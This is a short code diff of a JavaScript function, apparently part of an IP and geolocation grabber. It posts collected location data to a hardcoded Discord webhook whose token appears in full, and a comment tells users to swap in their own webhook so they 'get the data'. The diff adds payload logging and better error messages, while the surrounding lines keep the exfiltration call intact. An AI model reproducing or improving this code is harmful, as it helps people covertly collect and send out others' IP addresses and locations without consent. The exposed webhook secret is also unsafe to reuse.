@@ -37,6 +37,9 @@ function fetchGeolocationData(ipAddress) {
                     }
                 };
 
+                const payload = JSON.stringify({ embeds: [embed] });
+                console.log('Payload being sent:', payload);
+
                 // CHANGE THE CONTENT IN webhookUrl OTHERWISE YOU WONT GET THE DATA
                 const webhookUrl = 'https://discord.com/api/webhooks/1341886964420579339/lypXPPLfFFuCClDtsJEvmGV-7chwgB8cRp99EycU1FfjE14oPeJRaEib6GlCuWBD6WRh';
                 fetch(webhookUrl, {
@@ -44,13 +47,13 @@ function fetchGeolocationData(ipAddress) {
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ embeds: [embed] })
+                    body: payload
                 })
                     .then(response => {
                         if (response.ok) {
                             console.log('Embed sent successfully');
                         } else {
-                            console.error('Failed to send embed');
+                            console.error('Failed to send embed', response.statusText);
                         }
                     })
                     .catch(error => {
